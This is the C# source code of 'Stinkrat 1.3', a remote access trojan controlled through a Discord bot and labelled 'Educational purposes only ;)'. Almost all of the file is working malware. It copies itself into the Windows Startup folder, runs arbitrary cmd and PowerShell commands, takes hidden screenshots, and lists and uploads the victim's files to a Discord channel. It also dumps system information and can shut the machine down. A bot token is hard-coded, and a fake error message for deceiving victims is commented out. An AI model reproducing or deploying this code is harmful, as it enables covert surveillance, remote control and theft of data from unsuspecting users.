// Educational purposes only ;)
// Stinkrat 1.3
using Discord;
using Discord.WebSocket;
using System.Diagnostics;
using System.Net;
using Point = System.Drawing.Point;
using Rectangle = System.Drawing.Rectangle;

/*
    Features
    - Open websites (!website <url>)
    - Get computer info (!info)/(!fullinfo)
    - Show message boxes (!message <message>)
    - Show open apps (!processes)
    - Kill tasks (!execute KILLTASK <task>)
    - Execute CMD Commands (!execute <command>) For powershell (!execute powershell <command>)
    - Shutdown machine (!shutdown)
    - Fake notification sound (!notification)
    - Spam terminal windows (!terminals)
    - Take a screenshot (!screenshot)
    - See files (!ls <directory>), e.g. !ls C:\Users\<username>\Downloads
    - Download files (!download <file>), e.g. !ls C:\Users\<username>\Downloads\image.png
    - Autostarts when they boot up too
*/

namespace App
{
    class RAT
    {
        public static void ShowMessage(string message)
        {
            MessageBox.Show(message, ":)", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
 
        public static void Screenshot()
        {
            Rectangle resolution = Screen.PrimaryScreen.Bounds;
            using(Bitmap bitmap = new Bitmap(resolution.Width, resolution.Height))
            {
                using(Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, resolution.Size);
                }
                string pathtosave = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                bitmap.Save($"{pathtosave}\\screenshot.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
                File.SetAttributes($"{pathtosave}\\screenshot.jpg", FileAttributes.Hidden); // hide it!!!
            }
        }

        public static string SystemInfo()
        {
            var os = Environment.OSVersion;
            var machine = Environment.MachineName;
            var username = Environment.UserName;

            return $"-> OS: {os}\n-> Machine Name: {machine}\n-> Username: {username}";
        }

        public static void OpenURL(string url)
        {
            Process.Start("cmd.exe", "/C explorer " + url);
        }

        public static string LogTasks()
        {
            Process[] processes = Process.GetProcesses();
            string msg = "";
            List<string> sent = new List<string>();
            foreach (Process process in processes)
            {
                if (sent.Contains(process.ProcessName)) continue;
                sent.Add(process.ProcessName);
                msg += process.Id + " | " + process.ProcessName + "\n";
            }
            return msg;
        }

        public static void Execute(string command)
        {
            Process.Start("cmd.exe", "/C " + command);
        }

        public static void Shutdown()
        {
            Process.Start("cmd.exe", "/C shutdown /p");
        }

        public static void StartUpPrograms()
        {
            // Remember to change this depending on the exe's name
            string exename = "RAT.exe";
            string path = $"{Directory.GetCurrentDirectory()}\\{exename}";
            string path2 = @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" + exename;
            try
            {
                if (!File.Exists(path)) using (FileStream fs = File.Create(path)) { };
                if (File.Exists(path2)) File.Delete(path2);
                File.Copy(path, path2);
            }
            catch
            {
                // Pass
            }
        }

        public static void SpamTerminalWindows()
        {
            for (int i = 0; i < 10; i++) // open 10 command prompt windows
            {
                Process.Start("cmd.exe");
            }
        }

        public static string FullDeviceInfo()
        {
            var processInfo = new ProcessStartInfo("cmd.exe", "/c systeminfo")
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardError = true,
                RedirectStandardOutput = true,
                WorkingDirectory = @"C:\Windows\System32\"
            };
            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            Process? p = Process.Start(processInfo);
            p!.OutputDataReceived += (sender, args) => sb.AppendLine(args.Data);
            p.BeginOutputReadLine();
            p.WaitForExit();
            return sb.ToString();
        }

        public static string ListDirectory(string directory)
        {
            var processInfo = new ProcessStartInfo("cmd.exe", $"/c dir {directory}")
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardError = true,
                RedirectStandardOutput = true,
                WorkingDirectory = @"C:\Windows\System32\"
            };
            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            Process? p = Process.Start(processInfo);
            p!.OutputDataReceived += (sender, args) => sb.AppendLine(args.Data);
            p.BeginOutputReadLine();
            p.WaitForExit();
            return sb.ToString();
        }
    }

    class Program
    {
        private readonly DiscordSocketClient _client;

        // Where log messages will be sent
        // replace these with the guild and channel id of where you want to control the bot
        ulong log_guild = 1030944732945326130;
        ulong log_channel = 1030944732945326134;
        string TOKEN = "MTAzMDk1MDUwNDU3NjA1NzM3NQ.GNt9wU.BkJiSIwALbDztRfQh9fzLUC-PXObgC3oHRVkP8"; // Keep this a secret

        // A fake error message will show when you run the program.
        //string message_content = "Graphics ERR in [UnityMain.dll] (0x0065e)";
        //string message_title = "UnityEngine Graphics Error";

        static void Main(string[] args)
             => new Program()
                .MainAsync()
                .GetAwaiter()
                .GetResult();

        public Program()
        {
            // check if the rat is already running
            string processname = Process.GetCurrentProcess().ProcessName; // the name of the process
            Process[] processes = Process.GetProcessesByName(processname);
            if (processes.Length == 1) // if theres more than 1 process
            {
                RAT.StartUpPrograms(); // enable autostarting the rat
                _client = new DiscordSocketClient();
                _client.MessageReceived += MessageReceivedAsync;
                _client.Ready += ClientReady;
            }
            else
            {
                System.Environment.Exit(1); // exit
            }
        }

        public async Task MainAsync()
        {
            await _client.LoginAsync(TokenType.Bot, TOKEN);
            await _client.StartAsync();
            await Task.Delay(Timeout.Infinite);
        }

        private async Task ClientReady()
        {
            await _client.GetGuild(log_guild).GetTextChannel(log_channel).SendMessageAsync("@everyone Connected to **`" + Environment.MachineName + "`** at **" + DateTime.Now.ToString("HH:mm:ss") + "**");
        }

        private async Task MessageReceivedAsync(SocketMessage message)
        {
            try
            {
                // should replace this with a switch statement soon
                if (message.Content == "!info")
                    await message.Channel.SendMessageAsync($"**```{RAT.SystemInfo()}```**");

                if (message.Content.StartsWith("!message"))
                    RAT.ShowMessage(message.Content.Trim().Replace("!message", ""));

                if (message.Content.StartsWith("!website"))
                    RAT.OpenURL(message.Content.Trim().Replace("!website", ""));

                if (message.Content == "!processes")
                    await message.Channel.SendMessageAsync($"**TASKS**\n**```{RAT.LogTasks()}```**");

                if (message.Content.StartsWith("!execute"))
                    RAT.Execute(message.Content.Trim().Replace("!execute", ""));

                if (message.Content.StartsWith("!ls")) 
                {
                    string args = message.Content.Replace("!ls", "").Trim();
                    // if no args
                    if (args == "") 
                    {
                        await message.Channel.SendMessageAsync(@"Please input a path first (e.g. C:\Users\user\Downloads)");
                        return;
                    }
                    // split the directory contents into 2000 character messages cunks
                    string str = RAT.ListDirectory(message.Content.Replace("!ls", "").Trim());
                    int chunkSize = 1990;
                    int stringLength = str.Length;
                    for (int i = 0; i < stringLength; i += chunkSize)
                    {
                        if (i + chunkSize > stringLength) chunkSize = stringLength - i;
                        await message.Channel.SendMessageAsync($"```{str.Substring(i, chunkSize)}```");
                    }
                }

                if (message.Content.StartsWith("!download"))
                    await message.Channel.SendFileAsync(@""+message.Content.Replace("!download", "").Trim());

                if (message.Content == "!shutdown")
                    RAT.Shutdown();

                if (message.Content == "!notification")
                    System.Media.SystemSounds.Exclamation.Play();

                if (message.Content == "!terminals")
                    RAT.SpamTerminalWindows();

                if (message.Content == "!fullinfo")
                {
                    string str = RAT.FullDeviceInfo();
                    int chunkSize = 1990;
                    int stringLength = str.Length;
                    for (int i = 0; i < stringLength; i += chunkSize)
                    {
                        if (i + chunkSize > stringLength) chunkSize = stringLength - i;
                        await message.Channel.SendMessageAsync($"```{str.Substring(i, chunkSize)}```");
                    }
                }

                if (message.Content == "!screenshot")
                {
                    RAT.Screenshot(); // make and save the screenshot
                    await message.Channel.SendFileAsync($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\screenshot.jpg");
                }
            }
            catch (Exception e)
            {
                await message.Channel.SendMessageAsync($"**An error was encountered, feel free to report this on github**\n{e}");
            }
        }
    }
}
